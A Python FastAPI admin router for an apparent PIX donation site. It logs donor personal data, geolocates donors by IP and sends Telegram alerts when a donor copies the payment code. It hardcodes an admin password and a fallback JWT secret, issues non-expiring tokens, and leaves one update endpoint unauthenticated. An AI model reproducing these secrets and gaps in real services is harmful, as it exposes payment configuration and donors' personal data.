from fastapi import APIRouter, HTTPException, Depends, Query, Request
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from pydantic import BaseModel
from datetime import datetime, timezone
import jwt
import os
import httpx
from pix_generator import generate_pix_payload
from telegram_bot import (
    notify_donation_created,
    notify_donation_copied,
    set_db as set_telegram_db,
    get_chat_id,
    _get_token as get_bot_token,
)

router = APIRouter(prefix="/api/admin")
security = HTTPBearer()

SECRET_KEY = os.environ.get('JWT_SECRET_KEY', 'doar-brasil-secret-key-2026-secure-token')

# Reference to db - set by server.py
db = None

def set_db(database):
    global db
    db = database
    set_telegram_db(database)

class LoginRequest(BaseModel):
    username: str
    password: str

class DonationCreate(BaseModel):
    value: float
    pix_code: str
    donor_name: str = ""
    donor_document: str = ""
    donor_phone: str = ""
    donor_email: str = ""
    device: str = ""
    tax_deduction: bool = False

class DonationUpdate(BaseModel):
    copied: bool

class PixKeyUpdate(BaseModel):
    pix_key: str

ADMIN_USERNAME = "donas"
ADMIN_PASSWORD = "Seinao10@@"

def verify_token(credentials: HTTPAuthorizationCredentials = Depends(security)):
    try:
        token = credentials.credentials
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
        return payload
    except Exception:
        raise HTTPException(status_code=401, detail="Token invalido ou expirado")

@router.post("/login")
async def login(request: LoginRequest):
    if request.username == ADMIN_USERNAME and request.password == ADMIN_PASSWORD:
        token = jwt.encode({"username": request.username}, SECRET_KEY, algorithm="HS256")
        return {"token": token, "username": request.username}
    raise HTTPException(status_code=401, detail="Credenciais invalidas")

@router.get("/donations")
async def get_donations(user=Depends(verify_token)):
    donations = await db.donations.find({}, {"_id": 0}).sort("created_at", -1).to_list(1000)
    return donations

async def get_location_from_ip(ip: str) -> str:
    """Busca cidade/estado a partir do IP do usuário"""
    try:
        async with httpx.AsyncClient(timeout=5) as client:
            resp = await client.get(f"http://ip-api.com/json/{ip}?fields=status,city,regionName&lang=pt-BR")
            data = resp.json()
            if data.get("status") == "success" and data.get("city"):
                return f"{data['city']}/{data.get('regionName', '')}"
    except Exception:
        pass
    return ""

@router.post("/donations")
async def create_donation(donation: DonationCreate, request: Request):
    # Capturar IP real do usuário
    client_ip = request.headers.get("x-forwarded-for", "").split(",")[0].strip() or request.client.host
    location = await get_location_from_ip(client_ip)

    donation_dict = {
        "donation_id": str(int(datetime.now(timezone.utc).timestamp() * 1000)),
        "value": donation.value,
        "pix_code": donation.pix_code,
        "donor_name": donation.donor_name,
        "donor_document": donation.donor_document,
        "donor_phone": donation.donor_phone,
        "donor_email": donation.donor_email,
        "device": donation.device,
        "location": location,
        "copied": False,
        "created_at": datetime.now(timezone.utc).isoformat()
    }
    await db.donations.insert_one(donation_dict)
    telegram_msg_id = await notify_donation_created(donation.value, donation.donor_name, donation.device, location)
    if telegram_msg_id:
        await db.donations.update_one(
            {"donation_id": donation_dict["donation_id"]},
            {"$set": {"telegram_message_id": telegram_msg_id}}
        )
    return {
        "donation_id": donation_dict["donation_id"],
        "value": donation_dict["value"],
        "pix_code": donation_dict["pix_code"],
        "donor_name": donation_dict["donor_name"],
        "device": donation_dict["device"],
        "location": donation_dict["location"],
        "copied": donation_dict["copied"],
        "created_at": donation_dict["created_at"]
    }

@router.patch("/donations/{donation_id}")
async def update_donation(donation_id: str, update: DonationUpdate):
    result = await db.donations.update_one(
        {"donation_id": donation_id},
        {"$set": {"copied": update.copied}}
    )
    if result.matched_count == 0:
        raise HTTPException(status_code=404, detail="Doacao nao encontrada")
    if update.copied:
        await notify_donation_copied(donation_id)
    return {"message": "Doacao atualizada"}

@router.delete("/donations/{donation_id}")
async def delete_donation(donation_id: str, user=Depends(verify_token)):
    result = await db.donations.delete_one({"donation_id": donation_id})
    if result.deleted_count == 0:
        raise HTTPException(status_code=404, detail="Doacao nao encontrada")
    return {"message": "Doacao removida"}


@router.get("/config")
async def get_config(user=Depends(verify_token)):
    config = await db.config.find_one({"key": "pix_key"}, {"_id": 0})
    if not config:
        return {"pix_key": ""}
    return {"pix_key": config.get("value", "")}

@router.put("/config/pix-key")
async def update_pix_key(data: PixKeyUpdate, user=Depends(verify_token)):
    await db.config.update_one(
        {"key": "pix_key"},
        {"$set": {"value": data.pix_key}},
        upsert=True
    )
    return {"message": "Chave PIX atualizada"}

class TelegramConfig(BaseModel):
    chat_id: str

@router.get("/config/telegram")
async def get_telegram_config(user=Depends(verify_token)):
    config = await db.config.find_one({"key": "telegram_chat_id"}, {"_id": 0})
    chat_id = config.get("value", "") if config else ""
    return {"chat_id": chat_id, "bot_configured": bool(get_bot_token())}

@router.put("/config/telegram")
async def update_telegram_config(data: TelegramConfig, user=Depends(verify_token)):
    await db.config.update_one(
        {"key": "telegram_chat_id"},
        {"$set": {"value": data.chat_id}},
        upsert=True
    )
    return {"message": "Telegram configurado"}

@router.post("/config/telegram/detect")
async def detect_telegram_chat(user=Depends(verify_token)):
    """Detecta automaticamente o chat_id do grupo onde o bot foi adicionado."""
    if not get_bot_token():
        raise HTTPException(status_code=400, detail="Token do bot nao configurado")
    import httpx
    async with httpx.AsyncClient() as client:
        r = await client.get(f"https://api.telegram.org/bot{get_bot_token()}/getUpdates")
        data = r.json()
    if not data.get("ok") or not data.get("result"):
        raise HTTPException(status_code=404, detail="Nenhuma mensagem encontrada. Envie uma mensagem no grupo primeiro.")
    chats = {}
    for update in data["result"]:
        msg = update.get("message") or update.get("my_chat_member", {}).get("chat")
        if msg:
            chat = msg.get("chat") or msg
            if chat.get("type") in ("group", "supergroup"):
                chats[str(chat["id"])] = chat.get("title", "Grupo")
    if not chats:
        raise HTTPException(status_code=404, detail="Bot nao foi adicionado a nenhum grupo ainda.")
    chat_id = list(chats.keys())[0]
    chat_name = chats[chat_id]
    await db.config.update_one(
        {"key": "telegram_chat_id"},
        {"$set": {"value": chat_id}},
        upsert=True
    )
    return {"chat_id": chat_id, "chat_name": chat_name, "message": f"Grupo '{chat_name}' detectado e configurado!"}

@router.post("/config/telegram/test")
async def test_telegram(user=Depends(verify_token)):
    """Envia mensagem de teste no grupo."""
    from telegram_bot import send_message
    chat_id = await get_chat_id()
    if not chat_id:
        raise HTTPException(status_code=400, detail="Chat ID nao configurado")
    await send_message("✅ <b>Teste de conexão</b>\n\nBot ParaQuemDoar conectado com sucesso!")
    return {"message": "Mensagem de teste enviada"}


@router.get("/stats")
async def get_stats(user=Depends(verify_token)):
    donations = await db.donations.find({}, {"_id": 0}).to_list(1000)
    total = sum(d.get("value", 0) for d in donations)
    copied_count = sum(1 for d in donations if d.get("copied", False))
    return {
        "total_value": total,
        "total_donations": len(donations),
        "copied_count": copied_count
    }

@router.delete("/donations")
async def clear_donations(user=Depends(verify_token)):
    result = await db.donations.delete_many({})
    return {"message": f"{result.deleted_count} doações removidas"}



# ============ ENDPOINTS PUBLICOS (sem auth) ============

# Gerar payload PIX valido
@router.get("/pix/generate")
async def generate_pix(value: float = Query(..., gt=0)):
    config = await db.config.find_one({"key": "pix_key"}, {"_id": 0})
    pix_key = config.get("value", "") if config else ""
    if not pix_key:
        raise HTTPException(status_code=400, detail="Chave PIX nao configurada no painel")

    payload = generate_pix_payload(
        pix_key=pix_key,
        amount=value,
    )
    return {"pix_code": payload, "pix_key": pix_key}

# Obter chave PIX publica (sem detalhes sensíveis, apenas se existe)
@router.get("/pix/status")
async def pix_status():
    config = await db.config.find_one({"key": "pix_key"}, {"_id": 0})
    has_key = bool(config and config.get("value"))
    return {"configured": has_key}
